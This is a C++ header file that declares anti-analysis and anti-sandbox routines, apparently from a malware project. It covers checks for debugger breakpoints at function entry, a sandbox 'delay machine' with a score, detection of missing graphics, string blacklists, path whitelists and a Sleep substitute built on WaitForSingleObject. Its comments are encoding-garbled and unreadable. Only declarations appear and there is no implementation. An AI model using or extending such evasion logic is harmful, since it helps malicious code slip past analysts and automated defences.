#pragma once

#include "global.hpp"

namespace antianalysis
{
	BOOL check_for_breakpoint(LPBYTE lpFunctionEntry);
	BOOL exec_all_longterm();
}


namespace antisbx
{
	class IAntiSandbox
	{
	public:
		virtual ~IAntiSandbox() = default;
		// ����� ���������� ������ � ������ ���������� ���������
		virtual BOOL enter() = 0;
	};

	// � ������ ���� ��� ���������� �� ������ ������ ���, �� ������� ����� ����������� � ��������� � � ����������� �� ���������� ����������� ����������
	// ������ ��� ����� ��������� �������� hid � ��������������� ������ ������ ��������� � parentbid, ���� hid == ������ ������ parentbid, �� �� ������ �� ������ �� ������ ���
	// ����� ������ ������ ��� � ���� ��������� ���������� ����������� ���������� � ��������� � ������� ����������� �������� � ������ ��������� Sleep
	// ���������� �������� � ������ ������� � removable �������� != ���������� ����� (������ ��������� ���� ����������� ��� removable) ��� �� UNC ����: ����� ������� ������� ������� � ���������� �� �����������
	class SandboxDelayMachineEntry : public IAntiSandbox
	{
	public:
		SandboxDelayMachineEntry();
		~SandboxDelayMachineEntry();

		// ������� ������������ �������� �� ������������� ��������, � ���� ��� ���������� �� � ������ ��� �� ���� ������ ��� ���������� � removable/UNC �����, �� ������� ��� ��������
		// ����� ��������� �������� - 10 ������, � ������������� ����������� �������� �� ������ ���� ���������: �������� �� ���������� �����������, �� ����������� ���������� � �.�.
		BOOL enter();

	protected:
		BOOL check_required();
		// �������� ��� �������� �� ���� � �������� ��������� �� ���������
		BOOL is_whitelist_path();
		// �������� ��� ������ �� ��� ������ �������: ���� ������� ��������� ��������, ���� ������ ��������� ����������� �� ������ ������
		BOOL is_entry_machine();
		// ������� ���������� ������, ��� ��� ���������. �� ������� ���������� 1
		INT get_score();

	private:
		// ��������, ��� ������� �� ������ �����-�� �����
		BOOL isNoGraphics();
		// ������ TRUE ���� ���������� ������ ���������� � ������ ������
		BOOL isBlacklisted(PWCHAR *pwBlacklist, UINT iBlacklistAmount, PWCHAR pwString);
		// �������� ����� WaitForSingleObject � �������� ����� Sleep, ���� Sleep ������ ���������� FALSE
		BOOL delay(DWORD dwMilliseconds);
	};
}

